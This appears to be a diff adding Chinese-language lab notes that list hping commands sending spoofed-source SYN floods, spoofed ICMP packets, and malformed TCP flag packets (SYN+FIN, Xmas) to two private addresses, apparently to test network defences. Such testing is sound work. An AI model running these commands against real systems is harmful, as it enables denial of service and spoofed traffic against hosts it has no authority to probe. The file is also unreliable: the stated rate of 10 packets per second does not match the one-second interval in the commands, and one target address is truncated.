@@ -1,0 +1,16 @@
+SYN Flooding(每秒10個封包)
+hping 192.168.2.2 -i u1000000 -S -a 偽造IP
+hping 192.168.2.3 -i u1000000 -S -a 偽造IP
+
+偽造IP的ICMP封包(每秒10個封包)
+hping 192.168.2.2 -i u1000000 -1 -a 偽造IP
+hping 192.168.2.3 -i u1000000 -1 -a 偽造IP
+
+不正常TCP Flag組合封包(每秒10個封包)
+(a)SYN+FIN
+hping 192.168.2.2 -i u1000000 -S -F -a 偽造IP
+hping 192.168.2.3 -i u1000000 -S -F -a 偽造IP
+
+(b)X'mas
+hping 192.168.2. -i u1000000 -F -S -R -P -A -U -a 偽造IP
+hping 192.168.2.3 -i u1000000 -F -S -R -P -A -U -a 偽造IP
